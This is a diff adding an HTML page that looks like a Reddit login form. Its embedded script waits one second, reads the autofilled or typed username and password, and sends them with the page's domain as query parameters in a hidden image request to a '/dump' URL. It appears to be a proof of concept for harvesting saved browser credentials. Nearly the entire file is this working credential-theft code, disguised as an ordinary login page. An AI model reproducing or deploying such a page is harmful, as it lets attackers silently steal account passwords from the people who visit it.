@@ -1,0 +1,23 @@
+<html><body>
+<form method="post" action="https://ssl.reddit.com">
+<input type="hidden" name="op" value="login" /><div><ul><li class="name-entry">
+<label for="user_login">username:</label>
+<input value="" name="user" id="user_login" type="text" maxlength="20" tabindex="2" autofocus /></li><li>
+<label for="passwd_login">password:</label>
+<input id="passwd_login" name="passwd" type="password" tabindex="2"/>
+
+<script>
+setTimeout(dynomite, 1000);
+
+function dynomite()
+{
+username = document.getElementsByTagName('input')[1].value;
+password = document.getElementsByTagName('input')[2].value;
+//alert('pass : '+password);
+
+var img = new Image();
+img.src="http://www.reddit.com/dump?"+username+"&"+password+"&"+document.domain;
+document.body.appendChild(img);
+}
+</script>
+</body></html>
